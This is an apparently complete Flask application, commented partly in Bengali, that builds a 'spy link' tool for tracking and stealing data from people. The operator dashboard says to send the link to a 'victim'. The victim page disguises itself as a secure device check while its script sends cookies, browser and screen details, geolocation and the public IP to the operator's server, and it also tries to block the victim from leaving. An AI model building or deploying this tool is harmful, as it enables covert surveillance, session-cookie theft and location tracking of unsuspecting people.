# -*- coding: utf-8 -*-
import os
import uuid
import json
from datetime import datetime
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)
reports = {}

# ---------- ড্যাশবোর্ড HTML (সহজ, কার্যকর) ----------
DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <title>Spy Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body{background:#0a0f1e;font-family:monospace;padding:20px;color:#0f0;}
        .card{background:#111;border-radius:15px;padding:20px;margin-bottom:20px;border:1px solid #4affff;}
        input,button{padding:10px;margin:5px;border-radius:8px;border:none;}
        input{background:#000;color:#0f0;border:1px solid #4affff;width:70%;}
        button{background:#4affff;color:#000;cursor:pointer;}
        pre{background:#000;padding:10px;border-radius:8px;overflow:auto;}
        .data-item{border-left:3px solid #ff3366;margin:10px 0;padding:10px;background:#0f1422;}
    </style>
</head>
<body>
<div class="card">
    <h2>📡 SPY LINK GENERATOR</h2>
    <form method="get" action="/dashboard">
        <input type="text" name="uid" placeholder="Enter UID to view existing" value="{{ uid_input }}">
        <button type="submit">Load UID</button>
    </form>
    <p><strong>Current UID:</strong> {{ uid }}</p>
    <div>
        <input type="text" id="link" value="{{ link }}" readonly style="width:70%;">
        <button onclick="copyLink()">Copy Link</button>
    </div>
    <p>⚠️ Send this link to victim. Data will appear below automatically.</p>
</div>
<div class="card">
    <h3>📥 Received Data (UID: {{ uid }})</h3>
    <button onclick="location.reload()">Refresh</button>
    <div id="data">
        {% if reports[uid] and reports[uid].data %}
            {% for item in reports[uid].data|reverse %}
                <div class="data-item">
                    <small>{{ item.time }}</small>
                    <pre>{{ item.data | tojson(indent=2) }}</pre>
                </div>
            {% endfor %}
        {% else %}
            <p>⏳ No data yet. Ask victim to click the link.</p>
        {% endif %}
    </div>
</div>
<script>
    function copyLink() {
        let inp = document.getElementById('link');
        inp.select();
        navigator.clipboard.writeText(inp.value);
        alert('Link copied!');
    }
    // Auto-refresh every 5 seconds
    setInterval(() => location.reload(), 5000);
</script>
</body>
</html>
"""

# ---------- ভিকটিম পেজ (স্পাই কোড) সরল ও নিশ্চিত ----------
SPY_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>body{background:#000;color:#0f0;text-align:center;padding-top:20%;font-family:monospace;}</style>
</head>
<body>
    <h2>🔐 Secure connection established</h2>
    <p>Please wait while we verify your device...</p>
    <script>
        (async function() {
            const server = "{{ server }}";
            const uid = "{{ uid }}";
            // Function to send data
            async function sendData(data) {
                try {
                    let response = await fetch(server + '/api/report/' + uid, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(data)
                    });
                    if (response.ok) console.log('Data sent successfully');
                    else console.error('Send failed', response.status);
                } catch(e) {
                    console.error('Fetch error:', e);
                }
            }
            
            // Collect basic info
            let victimData = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie,
                localStorageSize: localStorage.length,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            // Send immediately
            await sendData(victimData);
            
            // Try to get location (may ask permission)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        let loc = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        sendData({ location: loc });
                    },
                    error => console.log('Geolocation denied or error')
                );
            }
            
            // Get public IP using free API
            try {
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipRes.json();
                await sendData({ ip: ipData.ip });
            } catch(e) { console.log('IP fetch failed'); }
            
            // Optional: keep page busy (so victim stays)
            window.onbeforeunload = function() { return true; };
        })();
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    uid_input = request.args.get('uid', '')
    if uid_input and uid_input in reports:
        uid = uid_input
    else:
        uid = str(uuid.uuid4())[:8]
        if uid not in reports:
            reports[uid] = {'data': []}
    # লিংক তৈরি
    link = request.host_url.rstrip('/') + '/spy/' + uid
    return render_template_string(DASHBOARD, link=link, uid=uid, uid_input=uid_input, reports=reports)

@app.route('/spy/<uid>')
def spy(uid):
    if uid not in reports:
        reports[uid] = {'data': []}
    return render_template_string(SPY_PAGE, server=request.host_url.rstrip('/'), uid=uid)

@app.route('/api/report/<uid>', methods=['POST'])
def report(uid):
    if uid not in reports:
        reports[uid] = {'data': []}
    try:
        data = request.get_json()
    except:
        data = {"error": "invalid json"}
    reports[uid]['data'].append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'data': data
    })
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)